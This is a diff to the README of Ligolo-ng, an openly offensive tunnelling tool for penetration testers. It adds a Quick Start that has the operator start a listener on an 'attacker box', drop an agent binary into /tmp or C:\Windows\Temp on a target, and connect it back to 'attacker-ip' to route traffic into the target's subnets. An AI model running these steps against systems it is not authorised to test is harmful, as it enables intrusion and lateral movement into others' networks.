@@ -27,6 +27,7 @@ We would like to thank the following people for their support in the development
 - [Introduction](#introduction)
 - [Features](#features)
 - [Demo](#demo)
+- [Quick Start](#quick-start)
 - [How is this different from Ligolo/Chisel/Meterpreter... ?](#how-is-this-different-from-ligolochiselmeterpreter-)
 - [How to use - documentation - tutorial](#how-to-use---documentation---tutorial)
 - [Does it require Administrator/root access ?](#does-it-require-administratorroot-access-)
@@ -62,6 +63,28 @@ tunnels from a reverse TCP/TLS connection using a **tun interface** (without the
 
 [Ligolo-ng-demo.webm](https://github.com/nicocha30/ligolo-ng/assets/31402213/3070bb7c-0b0d-4c77-9181-cff74fb2f0ba)
 
+## Quick Start
+### On attacker box (initialization):
+  1. Start server: `sudo ./proxy -selfcert -laddr 0.0.0.0:port-num` (copy to clipboard TLS fingerprint for the agent)
+      - without the `-laddr` flag the default listening port will be 11601
+  2. create a new interface: `ifcreate --name i1`
+
+### On a Linux target:
+  1. upload agent binary to /tmp
+  2. make agent executable: `chmod +x ./agent`
+  3. launch agent with server fingerprint: `/tmp/agent -connect attacker-ip:portnum -v -accept-fingerprint copied-server-TLS-fingerprint` (copied at server start)
+     
+### OR on a Windows target:
+  1. upload agent binary to C:\Windows\Temp
+  2. launch agent with server fingerprint: `C:\Windows\Temp\agent -connect attacker-ip:portnum -v -accept-fingerprint copied-server-TLS-fingerprint` (copied at server start)
+
+### On attacker box (after agent deployment):
+  1. list your sessions: `session`
+  2. check target interfaces: `ifconfig`
+  3. create a new route: `route_add --name i1 --route subnet-address/CIDR`
+  4. start a tunnel through this new route: `start --tun i1`
+
+  
 ## How is this different from Ligolo/Chisel/Meterpreter... ?
 
 Instead of using a SOCKS proxy or TCP/UDP forwarders, **Ligolo-ng** creates a userland network stack using [Gvisor](https://gvisor.dev/).
